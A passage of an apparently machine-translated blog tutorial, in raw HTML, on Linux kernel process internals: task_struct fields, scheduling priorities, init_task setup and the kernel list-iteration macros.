Prompt messages, such as printing hardware information when the driver starts</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_INFO 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Debug level messages</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_DEBUG 7</span></span><br></pre></td></tr></table></figure><hr><h3 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h3><h4 id="Status-of-the-process"><a href="#Status-of-the-process" class="headerlink" title="Status of the process"></a>Status of the process</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">long</span> state;    <span class="comment">/* -1为不可运行，0可以运行，大于0表示停止 */</span></span><br></pre></td></tr></table></figure><p>​The process in Linux consists of multiple states, and during operation, the process will switch in multiple situations with scheduling, and the information of the process is the basis for the process to make scheduling swaps</p><table><thead><tr><th align="center">State</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">TASK_RUNNING</td><td align="center">Runnable</td></tr><tr><td align="center">TASK_INTERRUPTIBLE</td><td align="center">Waiting</td></tr><tr><td align="center">TASK_UNINTERRUPTIBLE</td><td align="center">Uninterruptible waiting</td></tr><tr><td align="center">TASK_ZOMBIE</td><td align="center">Zombie</td></tr><tr><td align="center">TASK_STOPPED</td><td align="center">Pause</td></tr><tr><td align="center">TASK_SWAPPING</td><td align="center">Switching in&#x2F;out</td></tr></tbody></table><h4 id="Flags-of-the-process"><a href="#Flags-of-the-process" class="headerlink" title="Flags of the process"></a>Flags of the process</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags; <span class="comment">/* per process flags, defined below */</span></span><br></pre></td></tr></table></figure><p>​Used by the kernel to identify the state of the current process for the next operation</p><table><thead><tr><th align="center">Flag</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">PF_FORKNOEXEC</td><td align="center">The process has just been created and has not yet been executed</td></tr><tr><td align="center">PF_SUPERPRIV</td><td align="center">Super User Privileges</td></tr><tr><td align="center">PF_DUMPCORE</td><td align="center">Catching of exceptions</td></tr><tr><td align="center">PF_SIGNALED</td><td align="center">Process killed by signal</td></tr><tr><td align="center">PF_EXIRING</td><td align="center">The process begins to close</td></tr></tbody></table><h4 id="Identifier-of-the-process"><a href="#Identifier-of-the-process" class="headerlink" title="Identifier of the process"></a>Identifier of the process</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> pid;     <span class="comment">//Identifier of the process</span></span><br><span class="line"><span class="type">pid_t</span> tgid;    <span class="comment">//Group number of the thread</span></span><br></pre></td></tr></table></figure><h4 id="Relatives-between-processes"><a href="#Relatives-between-processes" class="headerlink" title="Relatives between processes"></a>Relatives between processes</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">real_parent</span>;</span> <span class="comment">/* real parent process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">parent</span>;</span> <span class="comment">/* recipient of SIGCHLD, wait4() reports */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * children/sibling forms the list of my natural children</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span>  <span class="comment">/* list of my children */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">sibling</span>;</span>   <span class="comment">/* linkage in my parent&#x27;s children list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">group_leader</span>;</span>   <span class="comment">/* threadgroup leader */</span></span><br></pre></td></tr></table></figure><p>​        Processes are created with an inheritance relationship; a process can create multiple child processes, which are the parents of these child processes, and these child processes have a sibling relationship with each other.</p><p>​        When creating a child process, the child process inherits most of the information from the parent process, which means that the child process copies most of the information from the task_struct structure of the parent process, except for the pid, and thus the system needs to record these relatives in order to collaborate between processes.</p><p>​        The task_struct structure of each process contains a number of pointers that connect the task _struct structures of all the processes to form a process tree.</p><table><thead><tr><th align="center">Relatives</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">real_parent</td><td align="center">real parent</td></tr><tr><td align="center">parent</td><td align="center">parent process</td></tr><tr><td align="center">children</td><td align="center">The head of the chain table, all elements of the chain table are its child processes</td></tr><tr><td align="center">sibling</td><td align="center">Insert the current process into the sibling chain</td></tr><tr><td align="center">group_leader</td><td align="center">Points to the first entry in its process group｜</td></tr></tbody></table><h4 id="ptrace-system-call"><a href="#ptrace-system-call" class="headerlink" title="ptrace system call"></a>ptrace system call</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ptrace;</span><br></pre></td></tr></table></figure><p>​        The ptrace system call provides the ability for the parent process to observe and control the execution of the child process, and allows the parent process to check and replace the values of the child process’ kernel image (including registers).</p><p>​        Basic principle: When ptrace tracing is used, all signals sent to the traced child process are forwarded to the parent process, which is blocked. And after the parent process receives the signal, it can check and modify the stopped child process, and then let the child process continue to run. Please our common debugging tool gdb is based on ptrace to implement it.</p><h4 id="Scheduling-information-of-the-process"><a href="#Scheduling-information-of-the-process" class="headerlink" title="Scheduling information of the process"></a>Scheduling information of the process</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span> <span class="title">se</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_rt_entity</span> <span class="title">rt</span>;</span></span><br></pre></td></tr></table></figure><p>sched_class: Scheduling Class</p><p>se: Calling entities for common processes, each process has one of these entities</p><p>rt: Real-time process call entities, each process has one of these entities</p><p>​Process scheduling uses this information to determine a limited order of process execution, combined with process state information to ensure that processes run in a reasonable and orderly manner. Processes have various scheduling information, as follows.</p><table><thead><tr><th align="center">Name</th><th align="center">Meaning</th><th align="center">Usage</th></tr></thead><tbody><tr><td align="center">SCHED_OTHER</td><td align="center">Other scheduling methods</td><td align="center">Normal process</td></tr><tr><td align="center">SCHED_FIFO</td><td align="center">First in first out</td><td align="center">Real-time processes</td></tr><tr><td align="center">SCHED_RR</td><td align="center">Round-Robin</td><td align="center">Real-time processes</td></tr></tbody></table><h4 id="Priority-of-the-process"><a href="#Priority-of-the-process" class="headerlink" title="Priority of the process"></a>Priority of the process</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> prio, static_prio, normal_prio;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> rt_priority;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">Name</th><th align="center">Priority</th></tr></thead><tbody><tr><td align="center">prio</td><td align="center">Dynamic Priority</td></tr><tr><td align="center">static_prio</td><td align="center">Static Priority</td></tr><tr><td align="center">normal_prio</td><td align="center">Normal Priority</td></tr><tr><td align="center">rt_prio</td><td align="center">Real-time Priority</td></tr></tbody></table><ul><li>The value of prio is the final priority value used by the scheduler, i.e., the value actually chosen by the scheduler when selecting a process. The prio smaller, the process’s priority higher. prio values range from 0 to MAX_PRIO, i.e., 0 to 139 (including 0 and 139), and can be divided into two intervals depending on the scheduling strategy, where the interval 0 to 99 is for real-time processes and non-real-time processes in the range of 100~139.</li><li>static_prio static priority will not change over time, the kernel will not actively modify it, but only through the system call nice to modify static_prio, and the static priority calculation formula is <code>static_prio = MAX_RT_PRIO + nice +20</code>. The value of MAX_RT_PRIO is 100, and the range of nice range is -20 to +19, so the static_prio value ranges from 100 to 139. The smaller the value of static_prio, the higher the static priority of the process.</li><li>The value of normal_prio depends on the static priority and scheduling policy and can be set by the _setscheduler function. For non-real-time processes, the value of normal_prio is equal to the static priority value static_prio; for real-time processes, normal_prio &#x3D; MAX_RT_PRIO-1 - p-&gt;rt_priority.</li><li>The rt_priority value ranges from 0 ~ 99 and is only valid for real-time processes. From the equation: <code>prio = MAX_RT_PRIO-1 - p-&gt;rt_priority;</code> it can be seen that the larger the value of rt_priority, the smaller the value of prio, so the larger the value of real time priority (rt_priority) means the higher the priority of the process.</li></ul><h4 id="Time-data-information"><a href="#Time-data-information" class="headerlink" title="Time data information"></a>Time data information</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">cputime_t</span> utime, stime, utimescaled, stimescaled;</span><br><span class="line">    <span class="type">cputime_t</span> gtime;</span><br><span class="line">    <span class="type">cputime_t</span> prev_utime, prev_stime;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nvcsw, nivcsw; <span class="comment">/* context switch counts */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start_time</span>;</span>         <span class="comment">/* monotonic time */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">real_start_time</span>;</span>    <span class="comment">/* boot based time */</span></span><br><span class="line"><span class="comment">/* mm fault and swap info: this can arguably be seen as either mm-specific or thread-specific */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> min_flt, maj_flt;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_cputime</span> <span class="title">cputime_expires</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">cpu_timers</span>[3];</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">Name</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">utime&#x2F;stime</td><td align="center">Record the timers passed by the process in user&#x2F;kernel state</td></tr><tr><td align="center">utimescaled&#x2F;stimescaled</td><td align="center">Record the runtime of the process in user&#x2F;kernel state</td></tr><tr><td align="center">gtime</td><td align="center">Virtual machine time counted in beats</td></tr><tr><td align="center">prev_utime&#x2F;prev_stime</td><td align="center">Previous running time</td></tr><tr><td align="center">nvcsw&#x2F;nivcsw</td><td align="center">Voluntary&#x2F;Involuntary Context Switching Count</td></tr><tr><td align="center">start_time&#x2F;real_start_time</td><td align="center">Process creation time &#x2F; the latter includes sleep time｜</td></tr><tr><td align="center">cputime_expires</td><td align="center">Count the processor time of a process or process group being tracked｜</td></tr><tr><td align="center">｜min_flt, maj_flt</td><td align="center">Missing page statistics｜</td></tr></tbody></table><h4 id="Communication-between-processes"><a href="#Communication-between-processes" class="headerlink" title="Communication between processes"></a>Communication between processes</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line"><span class="comment">/* ipc stuff */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span> <span class="title">sysvsem</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>​If multiple processes are performing collaboration on a task, then it is necessary that these incoming processes can access each other’s resources and communicate with each other.<br>The main process communication methods in Linux are:</p><ul><li>pipes</li><li>semaphores</li><li>shared memory </li><li>signals</li><li>message queues</li></ul><h4 id="File-Information"><a href="#File-Information" class="headerlink" title="File Information"></a>File Information</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* file system info */</span>  </span><br><span class="line">    <span class="type">int</span> link_count, total_link_count;  </span><br><span class="line"><span class="comment">/* filesystem information */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> *<span class="title">fs</span>;</span>  </span><br><span class="line"><span class="comment">/* open file information */</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">define</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">struct fs_struct *fs</td><td align="center">Processes can be executed on the system where they affect</td></tr><tr><td align="center">struct files_struct *files</td><td align="center">Files opened by the process</td></tr></tbody></table><p>Processes can open or close files, which are system resources, and the Linux kernel has to keep a record of how the process uses the files.</p><p>There are two data structures in the task_struct structure to describe the information related to the process pre-file.</p><p>The fs _struct describes two VFS index nodes, called root and pwd, which point to the root and current or working directories corresponding to the process’s executable impact, respectively.</p><p>The file _struct structure is used to record the descriptors of the files opened by the process.</p><h4 id="Signal-processing-information"><a href="#Signal-processing-information" class="headerlink" title="Signal processing information"></a>Signal processing information</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span>;</span></span><br><span class="line"><span class="type">sigset_t</span> blocked, real_blocked;</span><br><span class="line"><span class="type">sigset_t</span> saved_sigmask; <span class="comment">/* restored if set_restore_sigmask() was used */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span> <span class="title">pending</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sas_ss_sp;</span><br><span class="line"><span class="type">size_t</span> sas_ss_size;</span><br><span class="line"><span class="type">int</span> (*notifier)(<span class="type">void</span> *priv);</span><br><span class="line"><span class="type">void</span> *notifier_data;</span><br><span class="line"><span class="type">sigset_t</span> *notifier_mask;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">name</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">signal</td><td align="center">Signal descriptor pointing to the process</td></tr><tr><td align="center">sighand</td><td align="center">Signal handler descriptor pointing to the process</td></tr><tr><td align="center">blocked</td><td align="center">Indicates the mask of the blocked signal, real_blocked indicates a temporary mask</td></tr><tr><td align="center">pending</td><td align="center">Data structure for storing private pending signals</td></tr><tr><td align="center">saa_ss_sp</td><td align="center">Alternate stack address for signal handlers, ass_ss_size indicates the stack size</td></tr><tr><td align="center">notifier_data&#x2F;notifier_mask</td><td align="center">The device driver uses the function pointed to by the notifier to block certain semaphores of the process. notifier_data is the data that may be used by the function pointed to by the notifier</td></tr></tbody></table><h4 id="虚拟内存处理"><a href="#虚拟内存处理" class="headerlink" title="虚拟内存处理"></a>虚拟内存处理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>, *<span class="title">active_mm</span>;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">define</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">struct mm_struct *mm</td><td align="center">Describe the address space of the process</td></tr><tr><td align="center">struct mm_struct *activa_mm</td><td align="center">Address space borrowed by kernel threads</td></tr></tbody></table><p>mm_struct is used to describe the address space (virtual space) of each process. active_mm is introduced for kernel threads, because kernel threads do not have their own address space. In order to make kernel threads have a uniform context switch with ordinary processes, when a kernel thread makes a context switch, let the active_mm of the switched-in thread point to the active_mm of the process that has just been dispatched out.</p><h4 id="Page-management-information"><a href="#Page-management-information" class="headerlink" title="Page management information"></a>Page management information</h4><p>When there is not enough physical memory, the Linux memory management system needs to transfer some pages from memory to external memory, and the swap is done on a page-by-page basis.</p><table><thead><tr><th align="center">define</th><th align="center">Meaning</th></tr></thead><tbody><tr><td align="center">int swappable</td><td align="center">Whether the memory pages occupied by the process can be swapped out</td></tr><tr><td align="center">unsigned long min_flat, maj_flt, nswap</td><td align="center">The accumulated number of missing pages, the master count and the accumulated number of pages swapped out and in of the process</td></tr><tr><td align="center">unsigned long cmin_flat, cnswap</td><td align="center">Cumulative number of sub-page misses, pages swapped in, for this process as an ancestor process, for all its hierarchical child processes｜</td></tr></tbody></table><h4 id="Process-Queue-Pointer"><a href="#Process-Queue-Pointer" class="headerlink" title="Process Queue Pointer"></a>Process Queue Pointer</h4><ol><li><p><code>struct task_struct *next_task, *prev_task;</code> &#x2F;&#x2F; All processes (in the form of PCBs) form a two-way chain. next_task and prev_task are the front and back pointers to the chain. The head and tail of the chain are init_task (i.e. process 0).</p></li><li><p><code>struct task_struct *next_run, *prev_run;</code> &#x2F;&#x2F; The run_queue is a two-way circular chain of processes that are running or can be run with the process status TASK_RUNNING. The front and back pointers of the chain are next_run and prev_run, and the head and tail of the chain are both init_task (i.e. process 0).</p></li><li><p><code>struct task_struct *p_opptr, *p_pptr;</code>和<code>struct task_struct *p_cptr, *p_ysptr, *p_osptr; </code>&#x2F;&#x2F; The above are pointers to the original parent, parent, youngest child, and newer and older sibling processes respectively.</p></li></ol><p>TODO…</p><h3 id="init-task"><a href="#init-task" class="headerlink" title="init_task"></a>init_task</h3><p>init_task is the first process of the kernel, process number 0, which becomes idle process when the initialization of the kernel is completed</p><p><strong>init_task</strong> is a task_struct prototype for all processes and threads in the kernel. During kernel initialization, a task_struct interface is constructed by static definition, named init_task, and then a new <strong>kernel init thread, kthreadd kernel thread</strong>, is created by the rest_init() function later in the kernel initialization</p><ul><li><p>The <strong>kernel init thread</strong>, which eventually executes the &#x2F;sbin&#x2F;init process, becomes the root process of all user state programs (as shown by the pstree command), i.e. the user space init process</p><p>  The first init is a kernel thread created by kthread_thread, which, after initialization, moves to user space and generates the ancestors of all user processes</p></li><li><p><strong>kernel kthreadd kernel thread</strong>, becomes the parent of all other daemon threads in the kernel state.</p><p>  Its task is to manage and schedule other kernel threads kernel_thread, which loops through a kthread function that runs the kthreads maintained in the kthread_create_list global chain, and the kernel threads created when we call kernel_thread are added to this chain, so all kernel threads are directly or indirectly parented to kthreadd</p></li></ul><p>The kernel will use the init_task as its task_struct structure descriptor, and when the system has nothing else to do, it will schedule its execution. At this point, the kernel will become an idle process, giving up the CPU and putting itself to sleep in a continuous loop.</p><h4 id="Initialization-of-the-stack"><a href="#Initialization-of-the-stack" class="headerlink" title="Initialization of the stack"></a>Initialization of the stack</h4><p>The process <code>init_task</code> is defined in <code>init/init_task.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Initial task structure */</span>                                                       </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">init_task</span> =</span> INIT_TASK(init_task);                                                                                                                                                       </span><br><span class="line">EXPORT_SYMBOL(init_task); </span><br></pre></td></tr></table></figure><p>The macro for <code>INIT_TASK</code> is defined in <code>include/linux/init_task.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_TASK(tsk)  \                                                       </span></span><br><span class="line">&#123;                                                                       \       </span><br><span class="line">        .state          = <span class="number">0</span>,                                            \       </span><br><span class="line">        .<span class="built_in">stack</span>          = &amp;init_thread_info,                            \       </span><br><span class="line">        .usage          = ATOMIC_INIT(<span class="number">2</span>),                               \       </span><br><span class="line">        .flags          = PF_KTHREAD,                                   \       </span><br><span class="line">        .prio           = MAX_PRIO<span class="number">-20</span>,                                  \       </span><br><span class="line">        .static_prio    = MAX_PRIO<span class="number">-20</span>,                                  \       </span><br><span class="line">        .normal_prio    = MAX_PRIO<span class="number">-20</span>,                                  \       </span><br><span class="line">        .policy         = SCHED_NORMAL,                                 \       </span><br><span class="line">        .cpus_allowed   = CPU_MASK_ALL,                                 \       </span><br><span class="line">        .nr_cpus_allowed= NR_CPUS,                                      \       </span><br><span class="line">        .mm             = <span class="literal">NULL</span>,                                         \       </span><br><span class="line">        .active_mm      = &amp;init_mm,                                     \       </span><br><span class="line">        .restart_block = &#123;                                              \  </span><br><span class="line">        .......</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>We can see that the stack of the <code>init_task</code> process is pointing to the <code>init_thread_info</code></p><p>In the file <code>arch/arm/include/asm/thread_info.h</code>, <code>init_thread_info</code> is defined as follows</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> init_thread_info        (init_thread_union.thread_info) </span></span><br></pre></td></tr></table></figure><p><code>init_thread_info</code> is a member of <code>thread_info</code> of <code>init_thread_union</code></p><p>Variable <code>init_thread_info</code> is defined in <code>init/init_task.c</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span> <span class="title">init_thread_union</span> __<span class="title">init_task_data</span> =</span>                            </span><br><span class="line">        &#123; INIT_THREAD_INFO(init_task) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_THREAD_INFO(tsk)                                           \                                                                                                                                  </span></span><br><span class="line">&#123;                                                                       \       </span><br><span class="line">        .task           = &amp;tsk,                                         \       </span><br><span class="line">        .flags          = <span class="number">0</span>,                                            \       </span><br><span class="line">        .preempt_count  = INIT_PREEMPT_COUNT,                           \       </span><br><span class="line">        .addr_limit     = KERNEL_DS,                                    \       </span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __init_task_data __attribute__((__section__(<span class="string">&quot;.data..init_task&quot;</span>)))</span></span><br></pre></td></tr></table></figure><ol><li>Declares the <code>init_thread_union</code> variable of type <code>thread_union</code>, then assigns values to the <code>thread_info </code> member of <code>init_thread_union</code>, mainly <code>init_thread_union.thread_info thread_info. task=&amp;init_task</code>, pointing the <code>task</code> member of this variable to <code>init_task</code>.</li><li><code>attribute((section(&quot;.data...init_task&quot;))</code>, specifying that the <code>section</code> name is <code>.data...init_task</code>, will be compiled into <code>vmlinux</code> at the beginning of <code>.data</code>.</li></ol><h4 id="Stack-compilation-into-vmlinux-TODO"><a href="#Stack-compilation-into-vmlinux-TODO" class="headerlink" title="Stack compilation into vmlinux (TODO)"></a>Stack compilation into vmlinux (TODO)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">243</span>         .data : AT(__data_loc) &#123;                                                </span><br><span class="line"><span class="number">244</span>                 _data = .;              <span class="comment">/* address in memory */</span>                 </span><br><span class="line"><span class="number">245</span>                 _sdata = .;                                                     </span><br><span class="line"><span class="number">246</span>                                                                                 </span><br><span class="line"><span class="number">247</span>                 <span class="comment">/*                                                              </span></span><br><span class="line"><span class="comment">248                  * first, the init task union, aligned                          </span></span><br><span class="line"><span class="comment">249                  * to an 8192 byte boundary.                                    </span></span><br><span class="line"><span class="comment">250                  */</span>                                                             </span><br><span class="line"><span class="number">251</span>                 INIT_TASK_DATA(THREAD_SIZE)  </span><br><span class="line">======&gt;</span><br><span class="line">                   . = ALIGN(<span class="number">8192</span>);                                               \        </span><br><span class="line">                  *(.data..init_task) </span><br></pre></td></tr></table></figure><p>TODO</p><h3 id="for-each-process-p"><a href="#for-each-process-p" class="headerlink" title="for_each_process(p)"></a>for_each_process(p)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> for_each_process(p)  for (p = &amp;init_task ; (p = next_task(p)) != &amp;init_task;)</span></span><br></pre></td></tr></table></figure><p>Start with init_task and iterate through all processes</p><p>Linux interlinks the task structures of all processes into a circular bidirectional chain, like (&amp;init_task)-&gt;next ! &#x3D; &amp;init_task goes on and on</p><h3 id="pid-task"><a href="#pid-task" class="headerlink" title="pid_task()"></a>pid_task()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">pid_task</span><span class="params">(<span class="keyword">struct</span> pid *pid, <span class="keyword">enum</span> pid_type type)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">result</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// First determine the pid can not be null, pid for null, pid_task return value is also null</span></span><br><span class="line"><span class="keyword">if</span> (pid) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">first</span>;</span></span><br><span class="line"><span class="comment">// The hlist_node *first can be found by the form parameter pid-&gt;tasks[type].</span></span><br><span class="line">first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]),</span><br><span class="line">      lockdep_tasklist_lock_is_held());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (first)</span><br><span class="line">result = hlist_entry(first, <span class="keyword">struct</span> task_struct, pids[(type)].node);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="module-param"><a href="#module-param" class="headerlink" title="module_param()"></a>module_param()</h3><p>For the explanation of the three parameters of module_param.<br>module_param(worldNum,int,0644);<br>The first parameter is the name of the parameter, defined by yourself<br>The second parameter is the type of the variable, such as int, long, char, float, etc.<br>The third parameter is the permission, similar to the permission of a file. Here it should mean which users can modify the meaning of this parameter.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* @perm is 0 if the the variable is not to appear in sysfs, or 0444</span><br><span class="line">* for world-readable, 0644 for root-writable, etc.</span><br></pre></td></tr></table></figure><p>Translated with <a href="http://www.deepl.com/Translator">www.DeepL.com/Translator</a> (free version)</p><h3 id="list-for-each"><a href="#list-for-each" class="headerlink" title="list_for_each()"></a>list_for_each()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * list_for_each    -   iterate over a list  </span></span><br><span class="line"><span class="comment"> * @pos:    the &amp;struct list_head to use as a loop counter.  </span></span><br><span class="line"><span class="comment"> * @head:   the head for your list.  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> list_for_each(pos, head) \  </span></span><br><span class="line">    <span class="keyword">for</span> (pos = (head)-&gt;next, prefetch(pos-&gt;next); pos != (head); \  </span><br><span class="line">        pos = pos-&gt;next, prefetch(pos-&gt;next))</span><br></pre></td></tr></table></figure><h3 id="list-entry"><a href="#list-entry" class="headerlink" title="list_entry()"></a>list_entry()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> list_entry(ptr, type, member) /</span></span><br><span class="line">    container_of(ptr, type, member)</span><br><span 